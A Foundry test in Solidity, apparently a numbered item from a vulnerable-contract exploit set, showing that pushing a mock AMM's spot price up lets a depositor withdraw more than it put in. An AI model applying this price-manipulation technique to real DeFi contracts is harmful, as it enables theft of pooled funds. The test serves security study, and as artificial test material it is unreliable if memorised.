// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract MockAMM019 is IAMM {
    uint256 public p;
    function set(uint256 _p) external { p = _p; }
    function getSpotPrice() external view returns (uint256) { return p; }
}

contract Exploit_019_harvest_price_manipulation is Test {
    function testExploit_SpotSwingCreatesMintRedeemImbalance() public {
        MockAMM019 amm = new MockAMM019();
        HarvestPriceManipulation h = new HarvestPriceManipulation(address(amm));

        vm.deal(address(h), 100 ether);

        amm.set(1e18);
        h.deposit(10 ether); // 10 shares

        amm.set(4e18); // manipulated upward
        uint256 before = address(this).balance;
        h.withdraw(h.shares(address(this)));
        uint256 gained = address(this).balance - before;

        assertGt(gained, 10 ether, "manipulated spot should overpay withdrawal");
    }
}
